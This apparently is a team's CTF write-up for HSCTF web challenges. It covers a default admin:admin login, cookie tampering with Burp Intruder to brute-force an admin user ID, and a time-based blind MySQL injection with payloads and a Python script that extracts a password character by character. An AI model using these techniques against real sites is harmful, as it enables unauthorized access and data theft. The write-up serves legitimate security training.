# web

## grading
> Solved by: Taz34

Simply login as `admin` using password `admin`
Go to the simple quiz section and here we have the flag.

![](https://i.imgur.com/ppinHMz.png)

```
flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}
```

---

## message-board
> Solved by: Taz34

I logged in using the given credentials.

Found a cookie named userData with userID and username

![](https://i.imgur.com/HZzaAdD.png)

here userID is `972` and username is `kupatergent`

Now i started looking into the given server code files and in one of the files named app.js
i found this:

![](https://i.imgur.com/SuX3MTK.png)

that indicates that we don’t need password for admin access we just need the correct user id.

So, now i fired up BurpSuite sent the request with cookie to the intruder replaced the username with admin and set the payload parameter at userID

```
Cookie: userData=j%3A%7B%22userID%22%3A%22§9§%22%2C%22username%22%3A%22admin%22%7D
```
![](https://i.imgur.com/YcqzWor.png)

Payload settings:

![](https://i.imgur.com/hvg4MID.png)

Also set up a grep match for flag{ as that is the starting of the flag

![](https://i.imgur.com/5VF3VGA.png)

And now we have to look for a ticked checkbox for flag{ and in the response section of that response we have the flag

![](https://i.imgur.com/4K3oZKR.png)

here we have the flag, we can confirm it on the website by changing the cookie values:

```
userID = 768
username = admin
```

![](https://i.imgur.com/loSsK8P.png)

```
flag{y4m_y4m_c00k13s}
```

---

## NRC - no right click
> Solved By : Starry-Lord

To bypass the right click problem:

```
view-source:https://no-right-click.hsc.tf/useless-file.css
```

![](https://i.imgur.com/euUZBnG.jpg)

---

# big blind
> Solved By : thewhiteh4t


- we are given a login page in this challenge
- the page source does not contain any JS
- After trying several things I found that we get status 500 on using `'` in either username or password field
- we don’t get an error if we use `'` in both fields
- A better test is to use the following :

```
user : ''
pass : '
```

- in the above case we get an error which shows that its due to an un-closed `'`
- we don’t get an error in the following case :

```
user : ''
pass : ''
```

- finally I confirmed that its blind SQL injection by using the following payload :

```
' or sleep(2) and 1=1#
```

- so here it was clear that its MySQL because syntax for others are different
- I used `SUBSTRING` and `SLEEP` to bruteforce the flag one character at a time
- payload :

```
' OR IF(SUBSTRING(pass,1,1)='f',sleep(5),sleep(0))#
```

- Explanation :
    - substring function requires three arguments
    - first argument is the string which we want to check
    - second argument is the position which we want to check
    - third argument is the length we want to check
    - to check one character at a time I incremented second argument each time and kept third argument fixed
- Usage of `IF` :
    - If uses three arguments
    - first is the condition
    - second is action if condition is `True`
    - third is action if condition is `False`
    - so when we find a match we will see a sleep of 5 seconds else page will load immediately
- Automation :

```python
from requests import post, ReadTimeout

url = 'https://big-blind.hsc.tf/'
charset = '_{}flagisodnbcehjkmpqrtuvwxyz'
flag = ''
counter = 0

while flag.endswith('}') != True:
    counter += 1
    for char in charset:
        payload = {
            'user': 'twh',
            'pass': f"' OR IF(SUBSTRING(pass,{counter},1)='{char}',sleep(5),sleep(0))#"
        }
        try:
            r = post(url, data=payload, timeout=3)
        except ReadTimeout:
            flag += char
            print(f'FLAG : {flag}')
            break
```

- output :

![](https://i.imgur.com/fAdPjA5.png)

---

## Digits of Pi 1
> Solved By : Starry-Lord

First thing, check the cells and find a formula. 

![](https://i.imgur.com/MT1NzjD.png)

Formula seems to be pointing to another sheet's called Source and its range 'A:B'. 

When you use spreadsheets, the accessibility tools actually help in un hiding hidden sheets, like the Source sheet here. 

To activate accessibility tools, go to Tools ('Outils' on the picture), and select Accessibility tools. 

![](https://i.imgur.com/2Rx5UPs.png)

Accessibility Tool include a way to call a range from the document so Monkey see🐒, Monkey do 🐒:

![](https://i.imgur.com/vlt5BiM.png)

**Note: it turns out you can reach a hidden sheet's full range by just typing its name ('Source' instead of 'Source'!A:B)**

It reveals the hidden sheet! On the bottom left you can see it got added to the panes. 

![](https://i.imgur.com/DJVGo4h.png)

And as suspected, you can find the flag in there somewhere. Thanks to my team mates for finding the flag for me

![](https://i.imgur.com/7ncbEkI.png)